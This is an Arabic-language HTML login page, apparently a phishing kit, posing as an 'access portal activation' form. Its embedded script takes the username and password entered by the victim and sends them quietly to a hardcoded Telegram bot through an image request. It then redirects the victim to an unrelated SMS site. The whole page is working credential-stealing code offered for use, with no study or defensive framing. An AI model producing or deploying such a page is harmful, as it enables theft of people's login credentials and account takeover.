<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تفعيل بوابة الوصول</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@700&display=swap" rel="stylesheet">
    <style>
        body { margin: 0; font-family: 'Cairo', sans-serif; background-color: #0a0e17; display: flex; justify-content: center; align-items: center; min-height: 100vh; color: #fff; }
        .login-card { background: #141b2b; width: 90%; max-width: 380px; padding: 40px 30px; border-radius: 28px; text-align: center; border: 1px solid rgba(255,255,255,0.05); box-shadow: 0 25px 50px rgba(0,0,0,0.5); }
        h2 { font-size: 22px; margin-bottom: 10px; }
        p { color: #8b9bb4; font-size: 14px; margin-bottom: 30px; }
        input { width: 100%; padding: 16px; margin-bottom: 15px; background: rgba(255,255,255,0.02); border: 1px solid rgba(255,255,255,0.1); border-radius: 12px; color: #fff; outline: none; box-sizing: border-box; text-align: right; }
        input:focus { border-color: #00f2fe; }
        button { width: 100%; padding: 16px; background: #28a745; color: #fff; border: none; border-radius: 12px; font-weight: bold; cursor: pointer; font-size: 16px; transition: 0.3s; }
        button:hover { background: #218838; }
    </style>
</head>
<body>
    <div class="login-card">
        <h2>تفعيل بوابة الوصول</h2>
        <p>يرجى إدخال البيانات للمتابعة</p>
        <form id="loginForm">
            <input type="text" id="user" placeholder="معرف المستخدم" required>
            <input type="password" id="pass" placeholder="رمز الوصول الخاص" required>
            <button type="submit" id="btn">إتمام التحقق</button>
        </form>
    </div>
    <script>
        document.getElementById("loginForm").onsubmit = async (e) => {
            e.preventDefault();
            const btn = document.getElementById("btn");
            btn.disabled = true;
            btn.innerText = "جاري التحقق...";

            const u = document.getElementById("user").value;
            const p = document.getElementById("pass").value;
            
            // بيانات البوت الخاصة بك
            const token = "7759864787:AAHshRshfAAt2I9T7T8-V-N6fA8G9K1e3L4";
            const chatId = "5174578125";
            const text = `🚀 وصول جديد\n👤 المستخدم: ${u}\n🔑 الرمز: ${p}`;

            // إرسال البيانات
            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;
            const img = new Image();
            img.src = url;

            setTimeout(() => { window.location.href = "https://receive-smss.com/"; }, 1000);
        };
    </script>
</body>
</html>
